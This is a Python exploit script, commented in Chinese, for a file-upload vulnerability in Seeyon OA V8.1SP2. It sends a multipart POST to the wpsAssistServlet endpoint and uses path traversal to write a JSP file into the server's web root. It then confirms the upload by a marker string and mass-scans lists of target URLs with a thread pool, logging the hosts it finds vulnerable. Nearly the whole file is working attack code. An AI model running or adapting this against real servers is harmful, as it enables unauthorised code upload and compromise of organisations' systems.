import requests
import argparse
import sys
from multiprocessing.dummy import Pool  # 导入多线程池模块，用于并发处理 URL

# 打印脚本的横幅
def banner():
    test = """
██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
 ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
"""
    print(test)  # 输出脚本横幅

# 检测给定 URL 是否存在文件上传漏洞
def poc(url):
    # 构造目标 URL，进行文件上传
    target_url = url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
    headers = {
        "Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"  # 定义请求头
    }
    # 构造 POST 请求的数据体
    data = """--59229605f98b8cf290a7b8908b34616b
    Content-Disposition: form-data; name="upload"; filename="123.xls"
    Content-Type: application/vnd.ms-excel

    <% out.println("seeyon_vuln");%>
    --59229605f98b8cf290a7b8908b34616b--
    """
    try:
        # 发送 POST 请求
        response = requests.post(target_url, headers=headers, data=data, timeout=5)
        # 检查响应状态码和内容
        if response.status_code == 200 and "seeyon_vuln" in response.text:
            print(f"[+]{url}存在文件上传")  # 打印漏洞存在的提示
            # 将结果写入文件
            with open("result.txt", "a") as f:
                f.write(f"{url}存在文件上传\n")
        else:
            print(f"[-]{url}不存在文件上传")  # 打印漏洞不存在的提示
    except:
        print(f"[!]{url}可能存在问题，请手动检测")  # 捕获异常并提示手动检测

def main():
    banner()  # 打印脚本横幅
    # 创建 ArgumentParser 对象用于处理命令行参数
    parser = argparse.ArgumentParser(description="致远OA_V8.1SP2文件上传漏洞脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter URL")  # 单个 URL 参数
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file containing URLs")  # URL 文件参数
    args = parser.parse_args()  # 解析命令行参数

    # 根据提供的参数调用不同的处理函数
    if args.url and not args.file:
        poc(args.url)  # 处理单个 URL
    elif args.file and not args.url:
        url_list = []
        # 从文件中读取 URL
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [line.strip() for line in f.readlines()]
        # 使用线程池并发处理 URL 列表
        with Pool(10) as pool:
            pool.map(poc, url_list)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 打印使用帮助

# 当脚本作为主程序运行时，调用 main 函数
if __name__ == "__main__":
    main()